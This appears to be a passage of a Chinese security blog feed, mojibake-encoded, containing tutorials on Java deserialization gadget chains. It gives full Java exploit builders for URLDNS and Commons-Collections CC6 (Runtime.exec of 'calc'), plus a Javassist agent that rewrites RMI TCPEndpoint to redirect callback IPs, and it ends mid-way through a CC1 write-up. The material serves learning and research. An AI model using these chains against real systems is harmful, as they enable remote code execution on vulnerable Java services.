class="hljs-string">&quot;sun.rmi.transport.tcp.TCPEndpoint&quot;</span>;<br>    <span class="hljs-keyword">public</span> String targetip;<br>    <span class="hljs-keyword">public</span> String callbackip;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TAT</span><span class="hljs-params">(String targetip,String callbackip)</span>&#123;<br>        <span class="hljs-built_in">this</span>.targetip = targetip;<br>        <span class="hljs-built_in">this</span>.callbackip = callbackip;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader,<br>                            String className,<br>                            Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        <span class="hljs-keyword">if</span> (Hook_class.equals(className))&#123;<br>            <span class="hljs-comment">//æ¥æ”¶targetIPå’ŒcallbackIPï¼Œç”¨äºæ¯”è¾ƒ</span><br><span class="hljs-comment">//            Scanner scanner = new Scanner(System.in);</span><br><span class="hljs-comment">//            System.out.print(&quot;Place input Callback_ip[String]&quot;);</span><br><span class="hljs-comment">//            String callback_ip = scanner.nextLine();</span><br><span class="hljs-comment">//            System.out.print(&quot;Place input Target_ip[String]&quot;);</span><br><span class="hljs-comment">//            String target_ip = scanner.nextLine();</span><br>            <br><span class="hljs-comment">///////å“ˆå“ˆå“ˆï¼Œå½“æ—¶æƒ³é˜»å¡ä¼ å€¼ï¼Œåæ¥å‘ç°å¯ä»¥è¿™æ ·ä¼ å°±æ²¡ç”¨ä¸Šé¢é‚£ç§äº†</span><br>            <br>            <br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            CtClass ctClass;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ctClass = pool.get(Hook_class1);<br>                <span class="hljs-comment">//æ·»åŠ targetip = è¾“å…¥çš„ç›®æ ‡åœ°å€</span><br>                <span class="hljs-type">CtField</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;targetip&quot;</span>, ctClass);<br>                param.setModifiers(Modifier.PUBLIC);<br>                ctClass.addField(param, CtField.Initializer.constant(targetip));<br><br>                <span class="hljs-comment">//æ·»åŠ callbackip = è¾“å…¥çš„å›è¿åœ°å€</span><br>                <span class="hljs-type">CtField</span> <span class="hljs-variable">param1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;callbackip&quot;</span>, ctClass);<br>                param1.setModifiers(Modifier.PUBLIC);<br>                ctClass.addField(param1, CtField.Initializer.constant(callbackip));<br><br>                System.out.println(<span class="hljs-string">&quot;TAT_____targetipï¼š&quot;</span>+targetip);<br>                System.out.println(<span class="hljs-string">&quot;TAT_____callbackipï¼š&quot;</span>+callbackip);<br><br>                <span class="hljs-comment">//åˆ›å»ºæ–°æ„é€ æ–¹æ³•å¹¶èµ‹å€¼</span><br>                <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), CtClass.intType,pool.get(<span class="hljs-string">&quot;java.rmi.server.RMIClientSocketFactory&quot;</span>),pool.get(<span class="hljs-string">&quot;java.rmi.server.RMIServerSocketFactory&quot;</span>)&#125;);<br>                System.out.println(<span class="hljs-string">&quot;aaa&quot;</span>);<br>                constructor.setBody(<span class="hljs-string">&quot;&#123;listenPort = -1;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        transport = null;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        if ($1 == callbackip) &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            $1 = $1;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125; else if ($1 ==null) &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            $1 = \&quot;\&quot;;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125; else &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            $1 = this.targetip;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        host =$1;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        port = $2;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        csf = $3;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        ssf = $4;&#125;&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;BBB&quot;</span>);<br>                <span class="hljs-comment">// å°†ä¿®æ”¹åçš„å­—èŠ‚ç ä¿å­˜åˆ°æ–‡ä»¶æˆ–åº”ç”¨ç¨‹åºä¸­</span><br>                ctClass.writeFile();<br>                <span class="hljs-keyword">return</span> ctClass.toBytecode();<br><br><br>            &#125; <span class="hljs-keyword">catch</span> (NotFoundException | IOException | CannotCompileException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br><br><br>        &#125;<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>MANIFEST.MFï¼š</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Manifest-Version: <span class="hljs-number">1.0</span><br>Can-Redefine-Classes: <span class="hljs-keyword">true</span><br>Can-Retransform-Classes: <span class="hljs-keyword">true</span><br>Can-<span class="hljs-keyword">Set</span>-Native-<span class="hljs-keyword">Method</span>-<span class="hljs-title function_">Prefix</span>: <span class="hljs-keyword">true</span><br>Premain-<span class="hljs-keyword">Class</span>: Agent.Mainagent<br><br></code></pre></td></tr></table></figure><h2 id="åŸ‹å‘"><a href="#åŸ‹å‘" class="headerlink" title="åŸ‹å‘"></a>åŸ‹å‘</h2><p><img src="https://i.mji.rip/2023/09/28/6664fa9feb87b8877cdb35fe9317f471.png" alt="image-20230928172819145"></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æœ€å¥½ç”¨çš„ä¸¤æ¡é“¾</title>
    <link href="/2023/09/11/%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E4%B8%A4%E6%9D%A1%E9%93%BE/"/>
    <url>/2023/09/11/%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E4%B8%A4%E6%9D%A1%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>ä¸ºä»€ä¹ˆè¯´è¿™URLDNSå’ŒCC6ä¸¤æ¡é“¾æ¯”è¾ƒå¸¸ç”¨å‘¢ï¼Ÿ</p><p>è¿™æ˜¯å› ä¸ºå…¶ä»–é“¾æ¡åœ¨é«˜ç‰ˆæœ¬çš„jdkæ²¡æ³•åˆ©ç”¨æˆ–è€…æ˜¯åˆ©ç”¨æ¡ä»¶å¾ˆè‹›åˆ»ï¼Œæˆ–è€…è¿˜æœ‰ä¸€äº›ä¾èµ–ä¸Šçš„é™åˆ¶ã€‚æ€»çš„æ¥è¯´è¿™æ˜¯æ¯”è¾ƒå¥½ç”¨çš„ä¸¤æ¡é“¾ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬ç®€å•çœ‹çœ‹è¿™ä¸¤æ¡é“¾ã€‚è¿™é‡Œä¸ä¼šåƒä¹‹å‰CC1é‚£æ ·ä¸€æ­¥ä¸€æ­¥åˆ†æï¼Œä¸»è¦è¿˜æ˜¯åƒä½“ç°ä¸€äº›ç»†èŠ‚ã€‚</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>åœ¨URLDNSé‡Œï¼Œå…¶å®çœŸæ­£èƒ½å‘èµ·DNSè¯·æ±‚çš„å°±ä¸¤ä¸ªå‡½æ•°ä¸€ä¸ª<code>hashcode</code>ï¼Œä¸€ä¸ª<code>equals</code>ã€‚</p><h2 id="è°ƒç”¨é“¾ï¼š"><a href="#è°ƒç”¨é“¾ï¼š" class="headerlink" title="è°ƒç”¨é“¾ï¼š"></a>è°ƒç”¨é“¾ï¼š</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    *<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLStreamHandler</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLStreamHandler</span>.</span></span>get<span class="hljs-constructor">HostAddress()</span><br><br></code></pre></td></tr></table></figure><p>å¸¦ä¸Šå›¾ï¼ˆå›¾çš„é¡ºåºæ˜¯æŒ‰é“¾æ¡çš„åæ–¹å‘ï¼‰</p><h2 id="å›¾æµç¨‹åˆ†æï¼š"><a href="#å›¾æµç¨‹åˆ†æï¼š" class="headerlink" title="å›¾æµç¨‹åˆ†æï¼š"></a>å›¾æµç¨‹åˆ†æï¼š</h2><p><img src="https://ice.frostsky.com/2023/09/11/b9874ac967e2641313c586ec00083c49.png" alt="image-20230911182016088"></p><p><img src="https://ice.frostsky.com/2023/09/11/d2519a3e22cec5f3b293002b88408e67.png" alt="image-20230911182252319"></p><p><img src="https://ice.frostsky.com/2023/09/11/764040f1f4ba3efe16c4825dd73b5a4c.png" alt="image-20230911182415368"></p><p><img src="https://ice.frostsky.com/2023/09/11/cced5b7f9e6684446bf8af09cbc04126.png" alt="image-20230911182508305"></p><p>å…³é”®å­—keyéƒ½å·²ç»å‡ºç°äº†ï¼Œè¿™ä¸ªä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåé¢å°±ä¸çœ‹äº†ã€‚</p><h2 id="åˆ©ç”¨æ„é€ ï¼š"><a href="#åˆ©ç”¨æ„é€ ï¼š" class="headerlink" title="åˆ©ç”¨æ„é€ ï¼š"></a>åˆ©ç”¨æ„é€ ï¼š</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//åˆå§‹åŒ–Map</span><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object,Object&gt;();<br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://yuanyi.dnslog&quot;</span>);<br>        <span class="hljs-comment">//å› ä¸ºè¦ä¿®æ”¹URLä¸­çš„hashCodeï¼Œé¿å…åœ¨putçš„æ—¶å€™å°±å‘å‡ºdnslogè¯·æ±‚ã€‚</span><br>        <span class="hljs-comment">//è·å–URLçš„Classå¯¹è±¡</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">urlClass</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-comment">//è·å–è¢«ä¿æŠ¤çš„hashCode</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        <span class="hljs-comment">//è®¾ç½®ä¸ºå¯è®¿é—®</span><br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//å°†urlçš„hashCodeè®¾ç½®ä¸º666</span><br>        hashCode.set(url,<span class="hljs-number">666</span>);<br>        <span class="hljs-comment">//å°†hashcodeä¸º666çš„urlæ”¾å…¥ï¼Œå› ä¸ºä¸ç­‰äº-1æ‰€ä»¥ä¸ä¼šæ‰§è¡Œkey.hashcode()</span><br>        map.put(url,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//å°†urlçš„hashCodeè®¾ç½®ä¸º-1ã€‚ä¸ºåç»­ååºåˆ—åŒ–è°ƒç”¨key.hashcode()åšé“ºå«</span><br>        hashCode.set(url,-<span class="hljs-number">1</span>);<br><br>        serialize(map);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="è°ƒç”¨é“¾ï¼š-1"><a href="#è°ƒç”¨é“¾ï¼š-1" class="headerlink" title="è°ƒç”¨é“¾ï¼š"></a>è°ƒç”¨é“¾ï¼š</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span>/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªå…¥å£ç‚¹ï¼Œæˆ‘ä»¬ç›´æ¥é€‰æ‹©<code>HashMap.readObject()</code>ä½œä¸ºå…¥å£ç‚¹ã€‚</p><p>å¸¦ä¸Šå›¾ï¼ˆå›¾çš„é¡ºåºæ˜¯æŒ‰é“¾æ¡çš„åæ–¹å‘ï¼‰</p><h2 id="å›¾æµç¨‹åˆ†æï¼š-1"><a href="#å›¾æµç¨‹åˆ†æï¼š-1" class="headerlink" title="å›¾æµç¨‹åˆ†æï¼š"></a>å›¾æµç¨‹åˆ†æï¼š</h2><p><img src="https://ice.frostsky.com/2023/09/11/b209253607026548bc018894096fd3cd.png" alt="image-20230911164838948"></p><p><img src="https://ice.frostsky.com/2023/09/11/c40d690cdf8bbbf84064d9650eec2304.png" alt="image-20230911165639391"></p><p><img src="https://ice.frostsky.com/2023/09/11/28b3a631ad6a62098df83c68bada4ab7.png" alt="image-20230911170222137"></p><p><img src="https://ice.frostsky.com/2023/09/11/fee6d0251c5200c75d2e972e99a1722c.png" alt="image-20230911170423536"></p><p><img src="https://ice.frostsky.com/2023/09/11/c04381d1726028b240f8a5e4ef99a1cd.png" alt="image-20230911170829704"></p><p><img src="https://ice.frostsky.com/2023/09/11/3166f36cdaf53479203e62c099a43ab0.png" alt="image-20230911171508642"></p><p><img src="https://ice.frostsky.com/2023/09/11/8d8dc7e6b2788e277dee9b5a12b77140.png" alt="image-20230911171107380"></p><p><img src="https://ice.frostsky.com/2023/09/11/de7196997bbe166ce987cb5d6ff173b6.png" alt="image-20230911171647154"></p><h2 id="åˆ©ç”¨æ„é€ ï¼š-1"><a href="#åˆ©ç”¨æ„é€ ï¼š-1" class="headerlink" title="åˆ©ç”¨æ„é€ ï¼š"></a>åˆ©ç”¨æ„é€ ï¼š</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6_test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-comment">//è¿™ä¸ªè·ŸCC1ä¸€æ ·ï¼Œä¸ä¼šçš„å°ä¼™ä¼´å¯ä»¥çœ‹æˆ‘ä¹‹å‰CC1çš„æ–‡ç« ã€‚</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-comment">/*è¿™é‡Œä¹‹æ‰€ä»¥å…ˆåˆ›å»ºä¸€ä¸ªå‡çš„(æ²¡æœ‰æ•°æ®çš„)chainedTransformeræ˜¯å› ä¸º</span><br><span class="hljs-comment">        å¦‚æœæˆ‘ä»¬ç›´æ¥å°†çœŸçš„(å¸¦æœ‰æ•°æ®çš„)chainedTransformeræ”¾å…¥LazyMapä¸­å†åˆ°TiedMapEntry</span><br><span class="hljs-comment">        é‚£ä¹ˆåœ¨åç»­åºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°TiedMapEntry.hashCodeï¼Œé‚£ä¹ˆå†ååºåˆ—åŒ–å°±ä¸ä¼šå†æ‰§è¡Œäº†</span><br><span class="hljs-comment">        è·ŸURLDNSè¦ä¿®æ”¹hashcodeå…¶å®æ˜¯ä¸€ä¸ªé“ç†*/</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">fake_chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br>        <span class="hljs-comment">//åˆå§‹åŒ–MAP</span><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//åˆ›å»ºLazyMapï¼Œå¹¶å¼•å…¥åˆ°TiedMapEntry</span><br>        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, fake_chainedTransformer);<br>        Map.<span class="hljs-type">Entry</span>  <span class="hljs-variable">mapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, Runtime.class);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(mapEntry,<span class="hljs-string">&quot;adad&quot;</span>);<br>        <br>        <span class="hljs-comment">//åˆ©ç”¨åå°„å†æŠŠChainedTransformerä¸­çš„Transformersæ”¹å›çœŸçš„ã€‚</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(fake_chainedTransformer,transformers);<br>        <span class="hljs-comment">//æ¸…ç©ºç”±äº hashmap å¯¹ LazyMap é€ æˆçš„å½±å“</span><br>        lazymap.clear();<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>é€šä¿—æ˜“æ‡‚çš„CC1ä¹‹æ‰‹æ“EXP</title>
    <link href="/2023/08/30/Java-CC1/"/>
    <url>/2023/08/30/Java-CC1/</url>
    
    <content type="html"><![CDATA[<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">æ¯ç¯‡æ¯’é¸¡æ±¤<br>    æ»´æ°´çŸ³ç©¿<br>                â€”â€”çç¼–çš„<br></code></pre></td></tr></table></figure><p>å‰è¨€ï¼š</p><p>å­¦javaååºåˆ—åŒ–ï¼Œæ€ä¹ˆèƒ½å°‘äº†å¯¹æ¯æ¡é“¾çš„ç†è§£å‘¢ï¼Ÿæœ¬ç¯‡æˆ‘ä»¬ä¸»è¦æ˜¯é€‰æ‹©CC1ä¸­çš„å…¶ä¸­ä¸€æ¡é“¾<code>TransformedMap</code>è¿›è¡Œæ‰‹æ“EXPï¼Œå¸Œæœ›å„ä½åŒå­¦å¸¦å¥½æ‰‹å¥—ï¼Œå°å¿ƒä½ çš„å°æ‰‹ç£¨å‡ºèŒ§å­ã€‚</p><p>CC1é“¾å…¶å®æ˜¯Javaååºåˆ—åŒ–ä¸­æœ€é‡è¦çš„ä¸€æ¡ï¼Œå¤§å®¶ä¸€å®šè¦è®¤çœŸç†è§£åƒé€ï¼Œè¿™æ ·å‰©ä¸‹çš„é“¾å­¦èµ·æ¥å°±ä¼šéå¸¸è½»æ¾ã€‚è€ŒCC1ä¸€å…±æ˜¯æœ‰ä¸¤æ¡ï¼šä¸€æ¡æ˜¯<code>Lazymap</code>,ä¸€æ¡æ˜¯<code>TransformedMap</code>ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹<code>TransformedMap</code>è¿™ä¸€æ¡ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/2daabec5cca1d6432f29bd5966826827.png" alt="image-20230830150305811"></p><p>æ•´ä¸ªæ¼æ´çš„è§¦å‘ç‚¹å°±æ˜¯åœ¨è¿™é‡Œï¼Œå¯ä»¥çœ‹åˆ°åœ¨InvokerTransformer.<code>transform</code>ä¸­å¯ä»¥åˆ©ç”¨åå°„è°ƒç”¨ä»»æ„æ–¹æ³•ã€‚è€Œå…¶ä¸­çš„å‚æ•°<code>iMethodName</code>ã€ <code>iParamTypes</code>ã€<code>iArgs</code>éƒ½æ˜¯å˜é‡ï¼Œæ˜¯é€šè¿‡InvokerTransformerçš„æ„é€ æ–¹æ³•ä¼ 